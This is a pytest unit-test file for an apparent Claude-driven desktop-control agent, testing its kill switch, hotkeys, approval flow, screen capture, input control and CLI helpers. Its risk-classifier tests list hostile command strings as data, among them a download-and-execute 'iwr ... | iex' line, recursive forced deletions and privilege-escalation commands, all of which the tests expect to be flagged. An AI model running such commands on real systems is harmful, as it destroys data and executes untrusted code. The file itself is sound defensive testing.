"""Unit tests: keys, safety, screen math, input controller, UIA, shell, CLI helpers, voice helpers."""
from __future__ import annotations

import asyncio
import json
import threading
import time

import pytest
from PIL import Image

from app import claude_cli, voice
from app.dpi import pick_primary_monitor
from app.input_control import InputController, ToolError, normalize_combo, normalize_key, split_combo
from app.safety import (ApprovalManager, Halted, HotkeyLogic, KillSwitch, classify_powershell, classify_ui_label, parse_voice_decision)
from app.screen import MAX_PIXELS, ScreenCapturer, compute_scale
from app.shell import build_argv, run_command
from app.uia import UiaService
from conftest import FakeScreenDriver


# ----------------------------------------------------------------------------- keys
@pytest.mark.parametrize("text,expected", [
    ("ctrl+c", ["ctrl", "c"]), ("Control+Shift+T", ["ctrl", "shift", "t"]), ("Return", ["enter"]), ("super+r", ["win", "r"]),
    ("alt+Tab", ["alt", "tab"]), ("Page_Down", ["pagedown"]), ("F5", ["f5"]), ("ctrl++", ["ctrl", "+"]), ("ctrl shift esc", ["ctrl", "shift", "esc"]),
    ("Escape", ["esc"]), ("a", ["a"]),
])
def test_normalize_combo(text, expected):
    assert normalize_combo(text) == expected


def test_split_combo_edge_cases():
    assert split_combo("+") == ["+"]
    with pytest.raises(ToolError):
        split_combo("   ")


@pytest.mark.parametrize("combo", ["win+l", "super+L", "ctrl+alt+delete"])
def test_blocked_combos(combo):
    with pytest.raises(ToolError):
        normalize_combo(combo)


def test_normalize_key_passthrough():
    assert normalize_key("F12") == "f12" and normalize_key("X") == "x" and normalize_key("5") == "5"


# ----------------------------------------------------------------------------- kill switch
def test_kill_switch_basics():
    k = KillSwitch()
    k.check()
    k.trigger("test")
    with pytest.raises(Halted):
        k.check()
    with pytest.raises(Halted):
        k.wait(5)  # returns immediately, does not sleep 5s
    k.reset()
    k.check()


def test_kill_wakes_paused_threads():
    k = KillSwitch()
    k.pause()
    result = []

    def worker():
        try:
            k.gate()
            result.append("ran")
        except Halted:
            result.append("halted")

    t = threading.Thread(target=worker)
    t.start()
    time.sleep(0.15)
    assert result == []  # parked in the pause gate
    k.trigger("stop")
    t.join(2)
    assert result == ["halted"]


def test_pause_then_resume_lets_work_continue():
    k = KillSwitch()
    k.pause()
    done = []
    t = threading.Thread(target=lambda: (k.gate(), done.append(1)))
    t.start()
    time.sleep(0.1)
    assert not done
    k.resume()
    t.join(2)
    assert done == [1]


# ----------------------------------------------------------------------------- hotkeys
class Rec:
    def __init__(self):
        self.kills, self.ptt = [], []
        self.t = 0.0

    def logic(self, armed=True):
        return HotkeyLogic(lambda r: self.kills.append(r), lambda: self.ptt.append("down"), lambda: self.ptt.append("up"), armed=lambda: armed, now=lambda: self.t)


def tap(h, vk):
    h.feed(vk, True)
    h.feed(vk, False)


def test_double_esc_kills_but_single_does_not():
    r = Rec()
    h = r.logic()
    tap(h, 0x1B)
    assert r.kills == []
    r.t = 0.3
    tap(h, 0x1B)
    assert r.kills == ["Esc Esc"]


def test_slow_double_esc_does_not_kill():
    r = Rec()
    h = r.logic()
    tap(h, 0x1B)
    r.t = 5.0
    tap(h, 0x1B)
    assert r.kills == []


def test_ctrl_shift_esc_kills_and_suppresses_when_armed():
    r = Rec()
    h = r.logic(armed=True)
    h.feed(0xA2, True)  # LCtrl
    h.feed(0xA0, True)  # LShift
    assert h.feed(0x1B, True) is True
    assert r.kills == ["Ctrl+Shift+Esc"]
    r2 = Rec()
    h2 = r2.logic(armed=False)
    h2.feed(0x11, True), h2.feed(0x10, True)
    assert h2.feed(0x1B, True) is False  # idle: let Task Manager open as usual


def test_injected_events_never_trigger_kill_switch():
    r = Rec()
    h = r.logic()
    for _ in range(3):
        h.feed(0x1B, True, injected=True)
        h.feed(0x1B, False, injected=True)
    assert r.kills == []


def test_autorepeat_esc_is_not_a_double_press():
    r = Rec()
    h = r.logic()
    h.feed(0x1B, True)
    h.feed(0x1B, True)  # key auto-repeat while held
    h.feed(0x1B, True)
    assert r.kills == []


def test_push_to_talk_alt_space():
    r = Rec()
    h = r.logic()
    h.feed(0xA4, True)  # LAlt
    h.feed(0x20, True)
    h.feed(0x20, True)  # repeat ignored
    assert r.ptt == ["down"]
    h.feed(0x20, False)
    assert r.ptt == ["down", "up"]
    # releasing Alt first also ends it
    h.feed(0x20, True)
    h.feed(0xA4, False)
    assert r.ptt[-1] == "up"


def test_space_without_alt_is_not_ptt():
    r = Rec()
    h = r.logic()
    tap(h, 0x20)
    assert r.ptt == []


# ----------------------------------------------------------------------------- risk classification
@pytest.mark.parametrize("cmd,level", [
    ("Get-ChildItem C:\\Users", "none"),
    ("Start-Process notepad", "none"),
    ("Remove-Item C:\\temp\\x -Recurse -Force", "medium"),
    ("del /q *.tmp", "medium"),
    ("rm -rf ~/x", "medium"),
    ("Start-Process powershell -Verb RunAs", "high"),
    ("Restart-Computer -Force", "high"),
    ("reg add HKLM\\Software\\X /v a /d b", "high"),
    ("Set-ExecutionPolicy Unrestricted", "high"),
    ("iwr http://x/y.ps1 | iex", "high"),
    ("Stop-Process -Name chrome", "medium"),
    ("Send-MailMessage -To a@b.c", "medium"),
    ("git push --force origin main", "medium"),
    ("Get-Content notes.txt | Select-String 'remove item'", "none"),
    ("Write-Output 'format is fine'", "none"),
])
def test_classify_powershell(cmd, level):
    assert classify_powershell(cmd).level == level, cmd


def test_high_beats_medium():
    r = classify_powershell("Remove-Item x; Start-Process cmd -Verb RunAs")
    assert r.level == "high" and r.category == "admin" and len(r.reasons) == 2


@pytest.mark.parametrize("label,level,cat", [
    ("Delete", "medium", "delete"), ("Send", "medium", "send"), ("Buy now", "high", "purchase"), ("Place order", "high", "purchase"),
    ("Save", "none", "other"), ("Cancel", "none", "other"), (None, "none", "other"), ("Empty Recycle Bin", "medium", "delete"),
])
def test_classify_ui_label(label, level, cat):
    r = classify_ui_label(label)
    assert r.level == level and r.category == cat


@pytest.mark.parametrize("text,expected", [
    ("yes", True), ("Yes, go ahead", True), ("approve it", True), ("no", False), ("No, cancel that", False), ("don't do it", False),
    ("maybe", None), ("", None), ("yes and no", False), ("yes but don't delete the folder", False), ("do it", True),
])
def test_voice_decision(text, expected):
    assert parse_voice_decision(text) is expected


# ----------------------------------------------------------------------------- approvals
@pytest.mark.asyncio
async def test_approval_roundtrip_and_voice():
    events = []
    k = KillSwitch()
    mgr = ApprovalManager(lambda t, **kw: events.append((t, kw)), k, mode=lambda: "smart")
    task = asyncio.create_task(mgr.request("delete", "Delete 3 files", "details"))
    await asyncio.sleep(0.05)
    assert events[0][0] == "approval.request"
    aid = events[0][1]["id"]
    assert mgr.resolve(aid, True)
    d = await task
    assert d.approved and events[-1][0] == "approval.resolved"

    task = asyncio.create_task(mgr.request("send", "Send email"))
    await asyncio.sleep(0.05)
    assert mgr.resolve_by_voice("no, cancel") is False
    assert (await task).approved is False


@pytest.mark.asyncio
async def test_approval_timeout_denies_and_never_mode_autoapproves():
    mgr = ApprovalManager(lambda *a, **k: None, KillSwitch(), mode=lambda: "smart")
    d = await mgr.request("x", "y", timeout=0.05)
    assert not d.approved and d.via == "timeout"
    mgr2 = ApprovalManager(lambda *a, **k: None, KillSwitch(), mode=lambda: "never")
    assert (await mgr2.request("x", "y")).approved


@pytest.mark.asyncio
async def test_kill_cancels_pending_approvals():
    k = KillSwitch()
    mgr = ApprovalManager(lambda *a, **kw: None, k)
    task = asyncio.create_task(mgr.request("x", "y"))
    await asyncio.sleep(0.05)
    k.trigger("hotkey")
    d = await asyncio.wait_for(task, 2)
    assert not d.approved


# ----------------------------------------------------------------------------- screen
def test_compute_scale_respects_edge_and_pixels():
    s = compute_scale(1920, 1080, 1280)
    assert abs(s - 1280 / 1920) < 1e-9 and 1920 * s * 1080 * s <= MAX_PIXELS
    s4k = compute_scale(3840, 2160, 1280)
    assert round(3840 * s4k) <= 1280
    assert compute_scale(800, 600, 1280) == 1.0
    s_big_edge = compute_scale(2560, 1600, 1568)
    assert 2560 * s_big_edge * 1600 * s_big_edge <= MAX_PIXELS * 1.001


def test_pick_primary_monitor_prefers_origin_and_size():
    mons = [{"left": -1920, "top": 0, "width": 3840, "height": 1080},
            {"left": 1920, "top": 0, "width": 1280, "height": 720},   # secondary listed first
            {"left": 0, "top": 0, "width": 1920, "height": 1080}]
    assert pick_primary_monitor(mons, (1920, 1080))["width"] == 1920
    assert pick_primary_monitor(mons)["left"] == 0


def test_capture_scaling_and_coordinate_roundtrip(fake_input):
    cap = ScreenCapturer(FakeScreenDriver(fake_input), lambda: 1280, lambda: 70)
    shot = cap.capture()
    assert (shot.phys_width, shot.phys_height) == (1920, 1080)
    assert shot.width == 1280 and shot.height == 720
    img = Image.open(__import__("io").BytesIO(shot.jpeg))
    assert img.size == (1280, 720) and img.format == "JPEG"
    # model (640,360) is the screen centre
    assert cap.to_physical(640, 360, (1920, 1080)) == (960, 540)
    assert cap.to_model(960, 540, (1920, 1080)) == (640, 360)
    # clamped inside the screen
    assert cap.to_physical(99999, -5, (1920, 1080)) == (1919, 0)


def test_cursor_is_drawn_into_the_screenshot(fake_input):
    fake_input.pos = (960, 540)
    with_cursor = ScreenCapturer(FakeScreenDriver(fake_input), lambda: 1280, lambda: 90, lambda: True).capture()
    without = ScreenCapturer(FakeScreenDriver(fake_input), lambda: 1280, lambda: 90, lambda: False).capture()
    assert with_cursor.jpeg != without.jpeg


def test_zoom_region(fake_input):
    cap = ScreenCapturer(FakeScreenDriver(fake_input), lambda: 1280, lambda: 70)
    z = cap.zoom(320, 180, 640, 360)
    assert z.width >= 320
    with pytest.raises(ValueError):
        cap.zoom(10, 10, 12, 12)


# ----------------------------------------------------------------------------- input controller
def make_ctl(fake_input, human=False):
    k = KillSwitch()
    return InputController(fake_input, k, human_mouse=lambda: human), k


def test_click_modifiers_are_released(fake_input):
    ctl, _ = make_ctl(fake_input)
    ctl.click(100, 200, "left", 2, "ctrl+shift")
    assert fake_input.of("click") == [("click", 100, 200, "left", 2)]
    assert fake_input.down_keys == set()
    downs = [c[1] for c in fake_input.of("key_down")]
    assert downs == ["ctrl", "shift"]


def test_click_clamps_to_screen_and_validates(fake_input):
    ctl, _ = make_ctl(fake_input)
    assert ctl.click(5000, -10) == (1919, 0)
    with pytest.raises(ToolError):
        ctl.click(1, 1, button="banana")
    with pytest.raises(ToolError):
        ctl.click(1, 1, clicks=5)
    with pytest.raises(ToolError):
        ctl.click(1, 1, modifiers="enter")


def test_scroll_uses_wheel_notches(fake_input):
    ctl, _ = make_ctl(fake_input)
    ctl.scroll(None, None, "down", 2)
    ctl.scroll(None, None, "up", 1)
    ctl.scroll(None, None, "right", 1)
    assert fake_input.of("scroll") == [("scroll", -120), ("scroll", -120), ("scroll", 120)]
    assert fake_input.of("hscroll") == [("hscroll", 120)]


def test_type_is_chunked_and_press_releases_keys(fake_input):
    ctl, _ = make_ctl(fake_input)
    ctl.type_text("x" * 40 + "héllo wörld ✓")
    assert "".join(c[1] for c in fake_input.of("type")) == "x" * 40 + "héllo wörld ✓"
    assert len(fake_input.of("type")) >= 3
    ctl.press("ctrl+shift+t")
    assert fake_input.down_keys == set()
    assert [c[1] for c in fake_input.of("key_down")][-3:] == ["ctrl", "shift", "t"]
    assert [c[1] for c in fake_input.of("key_up")][-3:] == ["t", "shift", "ctrl"]


def test_drag_releases_button_when_killed_midway(fake_input):
    ctl, k = make_ctl(fake_input)
    orig = fake_input.move_to
    state = {"n": 0}

    def move(x, y):
        orig(x, y)
        state["n"] += 1
        if state["n"] == 6:
            k.trigger("test")

    fake_input.move_to = move
    with pytest.raises(Halted):
        ctl.drag(0, 0, 900, 900)
    assert fake_input.down_buttons == set()  # never leaves the mouse button stuck down


def test_kill_releases_held_keys(fake_input):
    ctl, k = make_ctl(fake_input)
    t = threading.Thread(target=lambda: _swallow(lambda: ctl.hold("ctrl+shift", 5)))
    t.start()
    time.sleep(0.15)
    assert fake_input.down_keys == {"ctrl", "shift"}
    k.trigger("kill")
    t.join(3)
    assert fake_input.down_keys == set()


def _swallow(fn):
    try:
        fn()
    except Halted:
        pass


def test_pause_blocks_actions_until_resume(fake_input):
    ctl, k = make_ctl(fake_input)
    k.pause()
    t = threading.Thread(target=lambda: ctl.click(10, 10))
    t.start()
    time.sleep(0.2)
    assert fake_input.of("click") == []
    k.resume()
    t.join(2)
    assert len(fake_input.of("click")) == 1


def test_human_mouse_glides_in_steps(fake_input):
    ctl, _ = make_ctl(fake_input, human=True)
    ctl.move(800, 600)
    moves = fake_input.of("move")
    assert len(moves) > 5 and moves[-1] == ("move", 800, 600)


# ----------------------------------------------------------------------------- UIA
@pytest.mark.asyncio
async def test_uia_snapshot_and_actions(fake_uia):
    svc = UiaService(fake_uia, to_model=lambda x, y: (round(x * 0.5), round(y * 0.5)))
    text = await svc.run(svc.snapshot, "foreground")
    assert 'Foreground window: "Untitled - Notepad"' in text
    assert '[1] Button "Save"' in text and "auto_id=btnSave" in text
    assert '[3] Edit "File name"' in text and "report.txt" in text
    assert "(50,50)-(90,65)" in text  # scaled to screenshot space
    assert "hidden" not in text  # zero-size controls skipped
    assert svc.center(1) == (140, 115, "Save")
    await svc.run(svc.invoke, 1)
    assert fake_uia.save_btn.invoked
    await svc.run(svc.set_text, 3, "new.txt")
    assert fake_uia.edit.text_set == "new.txt"
    with pytest.raises(ToolError):
        svc.set_text(1, "x")  # a Button is not a text field
    with pytest.raises(ToolError):
        svc.element(99)
    assert "report" in svc.read(3) or "new.txt" in svc.read(3)


@pytest.mark.asyncio
async def test_uia_windows_focus_and_label(fake_uia):
    svc = UiaService(fake_uia)
    listing = svc.list_windows()
    assert "Untitled - Notepad" in listing and "Calculator" in listing
    assert svc.focus_window("calc") == "Calculator" and fake_uia.other.focused
    with pytest.raises(ToolError):
        svc.focus_window("nope")
    assert svc.label_at(120, 110) == "Save" and svc.label_at(5, 5) is None


@pytest.mark.asyncio
async def test_uia_unavailable_is_a_clean_tool_error():
    svc = UiaService(None)
    assert not svc.available
    with pytest.raises(ToolError):
        await svc.run(lambda: 1)


# ----------------------------------------------------------------------------- shell
def test_shell_runs_and_reports_exit_code():
    res = run_command(build_argv("echo hello; exit 3"), 10, None, KillSwitch())
    assert "hello" in res.output and res.exit_code == 3 and "[exit code 3]" in res.render()


def test_shell_timeout_kills_process():
    t0 = time.time()
    res = run_command(build_argv("sleep 30"), 0.4, None, KillSwitch())
    assert res.timed_out and time.time() - t0 < 5


def test_shell_kill_switch_aborts_running_command():
    k = KillSwitch()
    threading.Timer(0.3, lambda: k.trigger("stop")).start()
    t0 = time.time()
    with pytest.raises(Halted):
        run_command(build_argv("sleep 30"), 60, None, k)
    assert time.time() - t0 < 5


def test_shell_output_truncation():
    res = run_command(build_argv("head -c 50000 /dev/zero | tr '\\0' 'a'"), 10, None, KillSwitch(), max_chars=1000)
    assert res.truncated and len(res.output) < 1300 and "omitted" in res.output


# ----------------------------------------------------------------------------- claude CLI helpers
def test_env_strips_api_billing_variables(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "tok")
    monkeypatch.setenv("CLAUDE_CODE_USE_BEDROCK", "1")
    monkeypatch.setenv("PATH_KEEP", "yes")
    env = claude_cli.sanitized_env({"OSAGENT_MCP_URL": "http://x"})
    assert "ANTHROPIC_API_KEY" not in env and "ANTHROPIC_AUTH_TOKEN" not in env and "CLAUDE_CODE_USE_BEDROCK" not in env
    assert env["PATH_KEEP"] == "yes" and env["OSAGENT_MCP_URL"] == "http://x"


def test_parse_auth_status_variants():
    pro = claude_cli.parse_auth_status(json.dumps({"loggedIn": True, "authMethod": "claude.ai", "apiProvider": "firstParty", "email": "a@b.c", "subscriptionType": "pro"}))
    assert pro.subscription_ok and pro.plan == "Pro" and pro.email == "a@b.c"
    api = claude_cli.parse_auth_status(json.dumps({"loggedIn": True, "authMethod": "api_key", "apiProvider": "firstParty"}))
    assert not api.subscription_ok and "api_key" in api.message and "Pro" in api.message
    bedrock = claude_cli.parse_auth_status(json.dumps({"loggedIn": True, "authMethod": "claude.ai", "apiProvider": "bedrock"}))
    assert not bedrock.subscription_ok
    out = claude_cli.parse_auth_status(json.dumps({"loggedIn": False, "authMethod": "none"}))
    assert not out.logged_in and not out.subscription_ok and out.message
    assert not claude_cli.parse_auth_status("not json").subscription_ok


def test_build_argv_is_gated_on_supported_flags(tmp_path):
    full = claude_cli.CliInfo("claude", "1", frozenset({"--include-partial-messages", "--strict-mcp-config", "--tools", "--permission-mode", "--permission-prompts", "--disable-slash-commands", "--append-system-prompt-file", "--effort"}), help_text='choices: "dontAsk"')
    argv = claude_cli.build_run_argv(full, mcp_config=tmp_path / "m.json", allowed_tools=["mcp__osagent__click", "WebSearch"], system_prompt="x", prompt_file=tmp_path / "p.txt", model="opus", effort="high", resume_id="abc")
    assert argv[:2] == ["claude", "-p"] and "--include-partial-messages" in argv and "--strict-mcp-config" in argv
    assert argv[argv.index("--allowedTools") + 1] == "mcp__osagent__click,WebSearch"
    assert argv[argv.index("--permission-mode") + 1] == "dontAsk" and argv[argv.index("--resume") + 1] == "abc"
    assert argv[argv.index("--model") + 1] == "opus" and argv[argv.index("--effort") + 1] == "high"
    assert argv[argv.index("--tools") + 1] == "WebSearch,WebFetch"
    assert not any(a for a in argv if a in ("--api-key",))
    old = claude_cli.CliInfo("claude", "0.1", frozenset({"--append-system-prompt"}), help_text="")
    argv2 = claude_cli.build_run_argv(old, mcp_config=tmp_path / "m.json", allowed_tools=["a"], system_prompt="line1\nline2", prompt_file=None, effort="high")
    assert "--permission-mode" not in argv2 and "--effort" not in argv2 and "--tools" not in argv2
    assert argv2[argv2.index("--append-system-prompt") + 1] == "line1 line2"  # newlines collapsed (cmd.exe-safe)
    argv3 = claude_cli.build_run_argv(old, mcp_config=tmp_path / "m.json", allowed_tools=["a"], system_prompt='say "hi" & 50% | <x> ^y', prompt_file=None)
    assert not any(ch in argv3[argv3.index("--append-system-prompt") + 1] for ch in '"%&|^<>')


def test_parse_stream_lines():
    P = claude_cli.parse_stream_line
    init = P(json.dumps({"type": "system", "subtype": "init", "session_id": "s1", "mcp_servers": [{"name": "osagent", "status": "connected"}]}))
    assert init[0]["kind"] == "init" and init[0]["session_id"] == "s1"
    a = P(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "Hi"}, {"type": "tool_use", "id": "t1", "name": "mcp__osagent__click", "input": {"x": 1}}]}}))
    assert [e["kind"] for e in a] == ["assistant_text", "tool_use"] and a[1]["input"] == {"x": 1}
    r = P(json.dumps({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "is_error": True, "content": [{"type": "text", "text": "bad"}, {"type": "image", "source": {}}]}]}}))
    assert r[0]["is_error"] and r[0]["text"] == "bad\n[image]"
    d = P(json.dumps({"type": "stream_event", "event": {"type": "content_block_delta", "delta": {"type": "text_delta", "text": "He"}}}))
    assert d == [{"kind": "text_delta", "text": "He"}]
    res = P(json.dumps({"type": "result", "subtype": "success", "is_error": False, "result": "done", "session_id": "s1", "num_turns": 3}))
    assert res[0]["ok"] and res[0]["turns"] == 3
    bad = P(json.dumps({"type": "result", "subtype": "error_during_execution", "is_error": True, "result": "boom"}))
    assert not bad[0]["ok"]
    assert P("garbage") == [] and P("{broken") == [] and P(json.dumps({"type": "assistant", "parent_tool_use_id": "x", "message": {}})) == []


# ----------------------------------------------------------------------------- voice helpers
@pytest.mark.parametrize("text,wake,expected", [
    ("Hey Claude, open notepad", "hey claude", "open notepad"),
    ("hey claude open the calculator please", "hey claude", "open the calculator please"),
    ("Hey, Claude! what time is it", "hey claude", "what time is it"),
    ("open notepad", "hey claude", None),
    ("hey there claude", "hey claude", None),
    ("hey claude", "hey claude", ""),
])
def test_wake_word(text, wake, expected):
    assert voice.strip_wake_word(text, wake) == expected


def test_transcript_cleaning_and_speech_text():
    assert voice.clean_transcript("Thank you.") == "" and voice.clean_transcript("  open   notepad ") == "open notepad"
    sp = voice.speakable("Done! See `C:\\x.txt` and [docs](http://a.b/c). ```code``` **bold**")
    assert "```" not in sp and "http" not in sp and "**" not in sp and "docs" in sp
    parts = voice.split_sentences("One. Two! Three? " + "word " * 100)
    assert parts[:3] == ["One.", "Two!", "Three?"] and all(len(p) <= 240 for p in parts)


@pytest.mark.asyncio
async def test_tts_chunks_stream_per_sentence():
    async def fake(text, voice_, rate):
        return text.encode()

    got = [(i, a, last) async for i, a, last in voice.tts_chunks("Hello there. How are you?", "v", "+0%", synth=fake)]
    assert got == [(0, b"Hello there.", False), (1, b"How are you?", True)]


def test_hotkey_service_calls_suppress_outside_exception_handler(monkeypatch):
    """pynput's suppress_event() raises by design; the filter must not swallow it."""
    import sys, types
    from app.safety import HotkeyService

    class Suppress(Exception):
        pass

    holder = {}

    class FakeListener:
        def __init__(self, win32_event_filter=None, on_press=None, on_release=None):
            holder["filter"] = win32_event_filter
            self.daemon = False

        def start(self): pass
        def stop(self): pass

        def suppress_event(self):
            raise Suppress()

    kb = types.ModuleType("pynput.keyboard"); kb.Listener = FakeListener
    pn = types.ModuleType("pynput"); pn.keyboard = kb
    monkeypatch.setitem(sys.modules, "pynput", pn); monkeypatch.setitem(sys.modules, "pynput.keyboard", kb)
    kills = []
    svc = HotkeyService(HotkeyLogic(lambda r: kills.append(r), lambda: None, lambda: None, armed=lambda: True))
    assert svc.start()
    ev = lambda vk, flags=0, msg=0x100: types.SimpleNamespace(vkCode=vk, flags=flags)  # noqa: E731
    f = holder["filter"]
    f(0x100, ev(0xA2)); f(0x100, ev(0xA0))             # LCtrl, LShift down
    with pytest.raises(Suppress):                       # Ctrl+Shift+Esc while armed -> propagated to pynput
        f(0x100, ev(0x1B))
    assert kills == ["Ctrl+Shift+Esc"]
    f(0x101, ev(0x1B)); f(0x101, ev(0xA0)); f(0x101, ev(0xA2))
    f(0x100, ev(0x1B, flags=0x10)); f(0x101, ev(0x1B, flags=0x10))  # injected (our own) Esc is ignored
    assert kills == ["Ctrl+Shift+Esc"]


def test_probe_understands_bracketed_file_variants(monkeypatch):
    class CP:
        def __init__(self, out): self.stdout = out
    outs = {"--version": b"2.1.332 (Claude Code)\n", "--help": b"  --append-system-prompt <prompt>\n  --bare   use --system-prompt[-file], --append-system-prompt[-file] instead\n"}
    monkeypatch.setattr(claude_cli, "run_quiet", lambda argv, **kw: CP(outs[argv[1]]))
    info = claude_cli.probe("claude")
    assert info.has("--append-system-prompt-file") and info.has("--system-prompt-file") and info.has("--append-system-prompt")
    assert info.version.startswith("2.1.332")


def test_old_floating_live_view_setting_migrates_instead_of_resetting_settings(tmp_path):
    import json
    from app.config import SettingsStore
    f = tmp_path / "settings.json"
    f.write_text(json.dumps({"theme": "dark", "live_view": "floating", "model": "sonnet"}))
    st = SettingsStore(f)
    assert st.value.live_view == "off" and st.value.theme == "dark" and st.value.model == "sonnet"
